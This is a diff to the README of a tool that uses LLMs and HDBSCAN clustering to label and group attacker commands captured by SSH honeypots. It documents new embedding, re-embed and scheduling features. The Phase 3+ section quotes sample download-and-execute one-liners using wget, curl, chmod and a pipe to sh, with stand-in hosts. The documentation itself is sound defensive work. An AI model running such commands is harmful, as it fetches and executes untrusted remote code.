@@ -31,6 +31,7 @@ Output is structured, timestamped, and queryable the same way any other ECS data
 | **1 - Command enrichment (local LLM)** | implemented | Per-unique-command doc with description, intent, MITRE IDs, IOCs, embedding, confidence. SQLite cache + watermark for incremental runs |
 | **2 - Cloud escalation** | implemented | Selectively route hard / novel / low-confidence commands to Claude for better labels. Daily $$ budget cap. Triage reasons logged on each escalated doc |
 | **3 - Clustering + novelty** | implemented | HDBSCAN over command embeddings; populates `dshield.cowrie.enrichment.cluster.{id, novelty_score, is_outlier}`. "Show me everything weird this week" becomes one query. Also feeds the `novel_embedding` triage rule in Phase 2 |
+| **3+ - Smarter embeddings + scalar augmentation** | implemented | Two additive improvements to clustering quality: embed enrichment context (intent + tactics + description) rather than raw command text; optionally weight behavioral scalars (frequency, source diversity, confidence) into the HDBSCAN matrix. `embed_version` added to cache key for safe invalidation |
 | **4 - Session + IP rollups** | planned | Aggregate command embeddings into per-session and per-IP vectors; cluster IPs into "campaigns"; surface IPs that don't fit any cluster (lone-wolf or new-campaign signal) |
 | **5 - Eval + monitoring** | planned | Hand-labeled regression set; weekly F1 against ground truth; structured worker logs to ES; alerts on budget / drift / failure rate |
 
@@ -98,7 +99,8 @@ The worker only **reads** from the SO-managed Cowrie events index. All enriched 
 | `src/dshield_vector_analysis/` | Python package: `cli`, `config`, `cache`, `es_client`, `enrich`, `cluster`, `healthcheck`, `triage`, `llm/{ollama,openai_compat,anthropic,schemas}` |
 | `es-mappings/dshield-cowrie-enrichment-mapping.json` | Settings + ECS-compliant mappings for the enrichment index |
 | `es-mappings/dshield-cowrie-clusters-mapping.json` | Settings + mappings for the cluster centroids index (Phase 3) |
-| `systemd/dshield_vector_analysis.service` + `.timer` | Hourly oneshot service + timer |
+| `systemd/dshield_vector_analysis.service` + `.timer` | Hourly oneshot enrich service + timer |
+| `systemd/dshield_vector_analysis_cluster.service` + `_cluster.timer` | 6-hourly cluster + escalate service + timer |
 | `scripts/setup-so-node.sh` | One-shot, idempotent SO-box installer |
 | `.env.example` | Secrets template (copy to `.env`) |
 | `.gitignore` | Excludes `.env`, `config/local.yaml`, `config/local.yml`, `*.sqlite`, `__pycache__` |
@@ -127,7 +129,9 @@ sudo -u dshield_vector_analysis .venv/bin/python -m dshield_vector_analysis.cli 
 | `cluster` | Phase 3: pull all embeddings, run HDBSCAN, compute novelty scores, bulk-update cluster fields on every enrichment doc, write centroid docs to the clusters index. |
 | `cluster --dry-run` | Fetch + cluster without writing anything to ES. Prints stats (n_clusters, n_outliers, runtime). |
 | `cluster --clusters-index <name>` | Override the clusters index name (default: derived from `enrichment_index`). |
-| `escalate` | Phase 3: cloud-escalate locally-enriched docs where novelty_score ≥ `novel_embedding_threshold` AND confidence ≤ `escalate_confidence_max`. Queries ES directly — no watermark, no cache — so it catches docs enriched in any previous run. Already cloud-enriched docs are never re-escalated. Run after each `cluster` pass. |
+| `re-embed` | Re-embed all enrichment docs using their stored enrichment fields (intent, tactics, techniques, description) — no LLM generation. Use after changing `embed_context` or bumping `embed_version`. Updates the SQLite cache to the new `embed_version` so the next `enrich` run skips the LLM for already-enriched commands. Follow with `cluster` to rebuild centroids from the new vectors. |
+| `re-embed --dry-run` | Count docs that would be re-embedded without calling the embedding model or writing to ES. |
+| `escalate` | Cloud-escalate locally-enriched docs where novelty_score ≥ `novel_embedding_threshold` AND confidence ≤ `escalate_confidence_max`. Queries ES directly — no watermark, no cache — so it catches docs enriched in any previous run. Already cloud-enriched docs are never re-escalated. Run after each `cluster` pass. |
 | `escalate --dry-run` | Count candidates matching both filters (novelty ≥ `novel_embedding_threshold` AND confidence ≤ `escalate_confidence_max`) without making cloud calls or writes. |
 | `budget` | Print today's cloud-LLM spend, daily cap, calls, token totals (Phase 2). |
 | `reset` | Clear local SQLite state. Default: cache + watermark. Flags: `--cache`, `--watermark`, `--all`, `--yes` (skip confirmation). Does NOT touch ES. |
@@ -152,9 +156,9 @@ sudo bash scripts/setup-so-node.sh
 **Flags:**
 | Flag | Effect |
 |---|---|
-| `--no-systemd` | Skip installing/enabling the timer |
+| `--no-systemd` | Skip installing/enabling the timers |
 | `--skip-healthcheck` | Continue past a failed healthcheck (NOT recommended) |
-| `--skip-init-index` | Don't run `init-index` |
+| `--skip-init-index` | Don't run `init-index` for either index |
 | `-h` / `--help` | Print the embedded usage block |
 
 **Environment overrides:**
@@ -168,12 +172,18 @@ sudo bash scripts/setup-so-node.sh
 
 The script is idempotent — re-run it after editing config or fixing healthcheck failures.
 
-The first enrichment run is **not** triggered by the script (it can take hours on a backlog). Run it manually:
+The first enrichment and cluster runs are **not** triggered by the script (enrich can take hours on a backlog). Run them manually:
 ```bash
 sudo -u dshield_vector_analysis /opt/dshield_vector_analysis/.venv/bin/python \
     -m dshield_vector_analysis.cli enrich --dry-run
 sudo -u dshield_vector_analysis /opt/dshield_vector_analysis/.venv/bin/python \
     -m dshield_vector_analysis.cli enrich
+
+# After the first successful enrich, seed the cluster index:
+sudo -u dshield_vector_analysis /opt/dshield_vector_analysis/.venv/bin/python \
+    -m dshield_vector_analysis.cli cluster
+sudo -u dshield_vector_analysis /opt/dshield_vector_analysis/.venv/bin/python \
+    -m dshield_vector_analysis.cli escalate   # only if cloud.enabled=true
 ```
 
 ---
@@ -404,14 +414,14 @@ Off by default. Phase 1 must already be running and producing docs. To turn it o
 | `base64_blob` | Command contains a base64-ish run ≥ `cloud.triage.base64_min_run` chars |
 | `ip_literal` | An IPv4 literal appears in the command |
 | `rare_tld` | A domain in the command uses a TLD listed in `cloud.triage.suspicious_tlds` |
-| `novel_embedding` | Phase 3: command's novelty score (distance to nearest cluster centroid) is ≥ `cloud.triage.novel_embedding_threshold` (default `0.5`). Only fires after Phase 3 has written centroids to the clusters index |
+| `novel_embedding` | Phase 3: fired by the `escalate` command (not `enrich`) — queries ES for locally-enriched docs whose stored `novelty_score` ≥ `cloud.triage.novel_embedding_threshold` and re-escalates them. During `enrich`, embedding is always the last step (after all LLM calls), so novelty distance is not computed at enrich time |
 | `sample` | Random `cloud.triage.sample_rate` fraction (default 1%) — quality monitoring |
 | `budget_exhausted` | Triage wanted to escalate but daily cap was already hit; no cloud call made |
 | `cloud_parse_failed` | Cloud was called but returned unparseable JSON; doc keeps local fields |
 
 **Cost control:** every cloud call's input + output tokens are converted to USD via `cloud.pricing.{input,output}_per_mtok` and tallied per UTC day in SQLite. Once the day's spend ≥ `cloud.daily_budget_usd`, further escalations are skipped (the doc still gets the local-only enrichment, with `triage_reasons: ["…", "budget_exhausted"]`). Update `pricing` if you change models — the defaults track Claude Sonnet 4.6 and may not match your model.
 
-**Cache semantics:** a successful local-only enrichment is cached with key `(short_hash, generation_model, prompt_version)`. A cloud rewrite of that same hash is also cached (under the same key — `prompt_version` covers both prompts together; bump it when either prompt changes). `local_failed` results without a cloud rescue stay uncached so they retry next run.
+**Cache semantics:** a successful local-only enrichment is cached with key `(short_hash, generation_model, prompt_version, embed_version)`. A cloud rewrite of that same hash is also cached under the same key. `local_failed` results without a cloud rescue stay uncached so they retry next run. Bump `worker.prompt_version` when either LLM prompt changes; bump `llm.embed_version` when `llm.embed_context` changes (see Phase 3+).
 
 ---
 
@@ -467,15 +477,17 @@ Stats include `docs_updated`, `cluster_docs_written`, and `runtime_seconds`. Aft
 
 ### 5. Schedule it
 
-Add a cron job (or systemd timer) to run `cluster` followed by `escalate` every 6 hours. The two commands are intentionally separate: `cluster` updates novelty scores for all docs; `escalate` then re-triages any locally-enriched doc whose score now exceeds the threshold.
+The setup script installs `dshield_vector_analysis_cluster.timer`, which runs `cluster` then `escalate` every 6 hours at 00:00, 06:00, 12:00, and 18:00 UTC (with up to 5 minutes of random jitter). No cron entry needed.
 
-Example cron (as root, after deploying):
-```
-0 */6 * * * dshield_vector_analysis /opt/dshield_vector_analysis/.venv/bin/python -m dshield_vector_analysis.cli cluster >> /var/log/dshield_cluster.log 2>&1
-5 */6 * * * dshield_vector_analysis /opt/dshield_vector_analysis/.venv/bin/python -m dshield_vector_analysis.cli escalate >> /var/log/dshield_cluster.log 2>&1
+To monitor it:
+```bash
+journalctl -fu dshield_vector_analysis_cluster.service
+systemctl list-timers dshield_vector_analysis_cluster.timer
 ```
 
-`escalate` is safe to re-run: it only queries for `event.provider: "local"` docs, so already cloud-escalated docs are never re-processed. If the daily budget is exhausted mid-run, it stops cleanly and picks up from the most novel remaining candidates next time.
+`escalate` is declared with a `-` prefix in the service unit so its failure (e.g. `cloud.enabled=false`) does not fail the service — `cluster` always runs regardless. If cloud is not enabled, the `escalate` step is a fast no-op that logs one warning line.
+
+`escalate` is also safe to re-run at any time: it only touches `event.provider: "local"` docs, so already cloud-escalated docs are never re-processed. If the daily budget is exhausted mid-run, it stops cleanly and picks up from the most novel remaining candidates next run.
 
 ### Kibana: long-tail dashboard queries
 
@@ -499,7 +511,7 @@ dshield.cowrie.enrichment.cluster.id : "cluster_3"
 
 ### novel_embedding triage rule
 
-Once Phase 3 has written centroids, the `novel_embedding` triage rule activates automatically in subsequent `enrich` runs (Phase 2 must be enabled). The `enrich` worker loads the latest centroid set from the clusters index at startup and computes each command's cosine distance to its nearest centroid. Commands whose novelty score is ≥ `cloud.triage.novel_embedding_threshold` (default `0.5`) are escalated to Claude.
+The `novel_embedding` triage rule is handled by the `escalate` command, not `enrich`. After each `cluster` run, `escalate` queries ES for locally-enriched docs whose `novelty_score` ≥ `cloud.triage.novel_embedding_threshold` (default `0.5`) and re-escalates them to Claude. This keeps embedding as the final step in `enrich` (after all LLM calls), avoiding a double-embed on escalated commands.
 
 To tune the thresholds, edit `config/local.yaml`:
 ```yaml
@@ -514,6 +526,73 @@ Note the distinction: the `novel_embedding` rule in `enrich` fires on **novelty 
 ### Cluster ID stability
 
 HDBSCAN cluster IDs (`cluster_0`, `cluster_1`, …) are **run-scoped** — they may shift between runs as new data arrives. Use `cluster.id` for filtering within a snapshot, not as a stable identifier across time. The `scored_at` timestamp tells you which run produced the labels on a given doc.
+
+---
+
+## Phase 3+ — Smarter embeddings + scalar feature augmentation
+
+Two additive improvements that tighten cluster quality without requiring new indexes or mapping changes.
+
+###  Semantic Embedding (including context about the command in the embed)
+
+**Problem:** the previous pipeline embedded the raw command *before* LLM enrichment. `wget http://x.sh | sh` and `curl http://y.sh | bash` are semantically identical but their raw text differs, so they could land in different clusters.
+
+**What changed:** `enrich.py` now follows the order: local LLM → (if needed) cloud LLM → embed. Embedding is always the final step, so the stored vector always reflects the final enrichment output — cloud if escalated, local otherwise. The embed-text string prepends the enrichment fields before the raw command:
+
+```
+intent: execution. tactics: TA0002, TA0011.
+Downloads and executes a shell script from a remote host via wget.
+Command: wget http://192.168.1.1/setup.sh -O /tmp/s && chmod +x /tmp/s && /tmp/s
+```
+
+If enrichment fails (`local_failed`), the fallback is the raw command — same as before.
+
+**Config** (`config/default.yaml`, override in `local.yaml`):
+
+```yaml
+llm:
+  embed_context:
+    - intent
+    - tactics
+    - description
+  embed_version: "v1"  # bump whenever embed_context changes
+```
+
+Set `embed_context: []` to revert to pre-Phase-3+ behavior (raw command only). Any change to `embed_context` must be accompanied by a bump to `embed_version` so cached docs are re-embedded.
+
+**`embed_version` and the cache key:** `embed_version` is now part of the enrichment cache key alongside `generation_model` and `prompt_version`. Existing cache rows created before Phase 3+ have `embed_version = v0` and will be treated as cache misses on the first run with `v1`.
+
+**Migration** (run once when upgrading an existing deployment):
+
+```bash
+# Re-embed all docs using stored enrichment fields — no LLM calls.
+# Updates SQLite cache entries to the new embed_version so next enrich skips the LLM.
+sudo -u dshield_vector_analysis .venv/bin/python -m dshield_vector_analysis.cli re-embed
+
+# Rebuild cluster centroids from the new vectors.
+sudo -u dshield_vector_analysis .venv/bin/python -m dshield_vector_analysis.cli cluster
+```
+
+If any docs fail to re-embed (network blip, embedding model timeout), they are left uncached and fall back to normal LLM re-enrichment on the next `enrich` run.
+
+### Scalar feature augmentation (include behavioral signals in the cluster)
+
+**Problem:** two commands with identical semantics can have wildly different behavioral signals — one seen 10,000× from 300 IPs (commodity), another seen once from a single IP (novel). The 768-dim embedding treats them identically.
+
+**What changed:** `cluster.py` appends a small (n × 3) scalar block to the L2-normalized embedding matrix before running HDBSCAN. The three features — log-normalized `occurrence_count`, `unique_source_ips`, and `confidence / 10` — let HDBSCAN separate commodity payloads from rare ones even when their text is similar.
+
+Centroid vectors written to the clusters index and used by the `novel_embedding` triage rule are still pure 768-dim. Novelty scores are computed against those pure centroids — so triage behaviour is unchanged.
+
+**Config** (`config/default.yaml`, override in `local.yaml`):
+
+```yaml
+cluster:
+  scalar_weight: 0.05   # scalar block contributes ~5% of vector norm; tune 0.0–0.15
+```
+
+Set `scalar_weight: 0.0` to disable. No data migration needed — runs on the next `cluster` pass.
+
+**Tuning:** monitor `n_outliers` after changing the weight. If it drops sharply, the scalar block is over-separating commodity from novel within what should be one cluster. If it stays broadly stable, the signal is additive.
 
 ---
 
@@ -568,7 +647,7 @@ Note: Kibana's `_score` field is the ES query relevance score (only meaningful f
 
 ## Operational notes
 
-- **Cache key** = `(short_command_hash, generation_model, prompt_version)`. Bump `worker.prompt_version` in `config/local.yaml` to force re-enrichment after prompt edits.
+- **Cache key** = `(short_command_hash, generation_model, prompt_version, embed_version)`. Bump `worker.prompt_version` after prompt edits (forces LLM re-enrichment + re-embedding). Bump `llm.embed_version` after changing `llm.embed_context`, then run `re-embed` to update vectors without re-running the LLM.
 - **Watermark** lives in SQLite (`/var/lib/dshield_vector_analysis/state.sqlite`). Loss of cache only costs LLM time, not data.
 - **Failure handling**: failed enrichments (`event.provider: "local_failed"`) are written to ES with empty fields but are **not cached**, so they will be retried whenever the same command appears again.
 - **Long commands** are truncated to 4000 chars before hashing; `dshield.cowrie.enrichment.command_truncated: true` is set on the doc.
